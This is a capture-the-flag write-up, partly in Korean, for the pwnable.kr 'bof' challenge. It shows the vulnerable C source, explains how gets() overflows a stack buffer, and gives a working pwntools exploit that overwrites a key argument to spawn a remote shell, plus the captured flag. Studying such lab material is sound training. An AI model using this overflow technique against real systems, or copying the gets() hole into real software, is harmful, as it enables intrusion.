# [pwnable.kr] bof

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Nana told me that buffer overflow is one of the most common software vulnerability. 
> Is that true?
>
> Download : http://pwnable.kr/bin/bof
> Download : http://pwnable.kr/bin/bof.c
>
> Running at : nc pwnable.kr 9000
>
> Release: [bof.zip](https://github.com/h0meb0dy/pwnable.kr/files/9079409/bof.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/178152860-2cddc4c0-90e5-47cb-9e27-1f1fb45dc206.png)

## Analysis

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

`func()`에서 `overflowme`에 `gets()`로 문자열을 입력받아서 BOF가 발생한다. 매개변수로 전달된 `key`를 `0xcafebabe`로 덮어쓰면 플래그를 획득할 수 있다.

## Exploit

`gets()`가 호출될 때 스택의 상태를 보면 아래와 같다.

![image](https://user-images.githubusercontent.com/104156058/178152993-a329612a-9194-4a9c-bb33-15b99d5948e3.png)

![image](https://user-images.githubusercontent.com/104156058/178153006-c5590edd-4b28-47be-b448-097b6449f491.png)

`key`는 `0xffffd350`에 저장되어 있다. `0x34`바이트의 dummy와 `0xcafebabe`를 입력하면 `key`가 `0xcafebabe`로 덮어씌워져서 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/bof')
else:
    r = remote('pwnable.kr', 9000)

r.sendline(b'A' * 0x34 + p32(0xcafebabe))

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
daddy, I just pwned a buFFer :)
```